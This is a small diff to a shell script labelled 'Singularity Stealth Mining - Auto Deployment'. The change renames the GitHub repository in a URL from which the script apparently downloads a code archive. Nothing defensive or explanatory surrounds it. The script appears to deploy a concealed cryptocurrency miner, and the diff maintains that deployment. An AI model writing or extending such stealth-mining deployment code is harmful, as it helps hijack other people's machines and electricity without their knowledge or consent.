@@ -4,7 +4,7 @@
 # Replace YOUR_GITHUB_USERNAME and YOUR_REPO_NAME below
 
 GITHUB_USER="temporaxinfinity-pixel"
-REPO_NAME="development"
+REPO_NAME="singular"
 GITHUB_URL="https://github.com/${GITHUB_USER}/${REPO_NAME}/archive/refs/heads/main.zip"
 
 echo "[*] Singularity Stealth Mining - Auto Deployment"
